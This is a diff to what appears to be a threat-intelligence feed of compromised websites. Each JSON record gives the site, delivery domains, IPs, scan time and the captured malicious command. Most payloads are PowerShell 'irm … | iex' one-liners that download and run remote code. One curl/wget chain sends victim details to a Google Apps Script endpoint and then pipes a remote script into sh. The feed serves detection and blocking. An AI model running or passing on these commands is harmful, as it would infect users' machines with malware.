@@ -1,5 +1,250 @@
 [
   {
+    "UrlDomain": "www.ascent.se",
+    "DeliveryUrl": [
+      "img-codes-cloude.info",
+      "sky.dolcefantasia.us",
+      "script.google.com",
+      "script-six-tawny.vercel.app",
+      "2fwww.ascent.se"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac"
+    ],
+    "IP": [
+      "46.30.213.93"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=bc759bae-8f26-4220-8046-410284017e55&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]ascent[.]se%2F&os=Linux%20x86_64&lastVisitAt=2026-11-24T19%3A30%3A35.746Z&lastShellAt=2026-11-24T19%3A30%3A35.746Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmwv3cmvm0d8p0nml83y5673a",
+    "ScannedAt": "2026-11-24T19:32:04.422000+00:00"
+  },
+  {
+    "UrlDomain": "www.stenohouse.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "68.178.175.10"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwv3bx2a0d6w0nmlyocu5mqg",
+    "ScannedAt": "2026-11-24T19:31:31.009000+00:00"
+  },
+  {
+    "UrlDomain": "mtelconnect.co.za",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "104.21.10.196"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/830dbb6c74bd64f3",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29925808",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/830dbb6c74bd64f3'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/830dbb6c74bd64f3"
+    ],
+    "ReportId": "cmwv3brgd0d650nmlz6sqlmmc",
+    "ScannedAt": "2026-11-24T19:31:23.551000+00:00"
+  },
+  {
+    "UrlDomain": "www.aracake.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "75.119.200.69"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwv38c020d1b0nmloakqhl75",
+    "ScannedAt": "2026-11-24T19:28:43.782000+00:00"
+  },
+  {
+    "UrlDomain": "sunsetsurfvillas.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info",
+      "base.gateway.tenderly.co"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "41.185.64.138"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/3103db9e23ffe1f2",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://base.gateway.tenderly.co",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/3103db9e23ffe1f2'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/3103db9e23ffe1f2"
+    ],
+    "ReportId": "cmwv2yx180cw80nml5hla7v62",
+    "ScannedAt": "2026-11-24T19:21:24.420000+00:00"
+  },
+  {
+    "UrlDomain": "chandigarhhenggcollege.rf.gd",
+    "DeliveryUrl": [
+      "cosmical2049.com"
+    ],
+    "PayloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "IP": [
+      "185.27.134.126"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
+    "ResolvedDownloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "ReportId": "cmwv2wyn60cpr0nmlweo0e7wl",
+    "ScannedAt": "2026-11-24T19:19:53.153000+00:00"
+  },
+  {
+    "UrlDomain": "newmember01.unaux.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.27.134.216"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/5de787e49bd3ae8c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=b9bb78ea241a8255eb076ae3d4aa6dc13e3b84ccbf21041c&amp;_v=29925798",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/5de787e49bd3ae8c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/5de787e49bd3ae8c"
+    ],
+    "ReportId": "cmwv2vc0b0cn20nmlwq65u37w",
+    "ScannedAt": "2026-11-24T19:18:37.269000+00:00"
+  },
+  {
+    "UrlDomain": "pitchayacarrent.net",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "27.254.81.144"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwv2dt510c780nmllwpk3z4p",
+    "ScannedAt": "2026-11-24T19:04:59.353000+00:00"
+  },
+  {
+    "UrlDomain": "s-cube.pro",
+    "DeliveryUrl": [],
+    "PayloadUrl": [
+      "https://s-cube.pro/"
+    ],
+    "IP": [
+      "92.53.123.166"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwv2cuv40c5y0nmllc3forq5",
+    "ScannedAt": "2026-11-24T19:04:14.960000+00:00"
+  },
+  {
+    "UrlDomain": "agritradeco.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/wp/1bc76e55aa259b71"
+    ],
+    "IP": [
+      "192.124.249.78"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/wp/1bc76e55aa259b71')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/wp/1bc76e55aa259b71"
+    ],
+    "ReportId": "cmwv2bev40c1c0nmlp2nfzdw7",
+    "ScannedAt": "2026-11-24T19:03:07.528000+00:00"
+  },
+  {
+    "UrlDomain": "camstvm.org",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/wp/6da752f480b0c5f8"
+    ],
+    "IP": [
+      "173.247.250.53"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/wp/6da752f480b0c5f8')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/wp/6da752f480b0c5f8"
+    ],
+    "ReportId": "cmwv2awoh0c040nmlb3t1x1r7",
+    "ScannedAt": "2026-11-24T19:02:44.216000+00:00"
+  },
+  {
     "UrlDomain": "eastwoodchurch.com",
     "DeliveryUrl": [
       "img-codes-cloude.info",
@@ -20872,53 +21117,5 @@
     ],
     "ReportId": "cmwb5cxvo00mr0nmly0i3xbks",
     "ScannedAt": "2026-11-10T20:32:54.395000+00:00"
-  },
-  {
-    "UrlDomain": "www.robertoscalco.it",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "89.46.109.47"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/de245c5f07077b06",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905654",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/de245c5f07077b06'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/de245c5f07077b06"
-    ],
-    "ReportId": "cmwb3aant00gt0nmlmc5pa0pm",
-    "ScannedAt": "2026-11-10T19:34:51.772000+00:00"
-  },
-  {
-    "UrlDomain": "ralphlauren-polo.com.co",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/20852d0346938afe",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/20852d0346938afe'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/20852d0346938afe"
-    ],
-    "ReportId": "cmwb2fd2s00g10nmllb1yc2q6",
-    "ScannedAt": "2026-11-10T19:10:48.567000+00:00"
   }
 ]
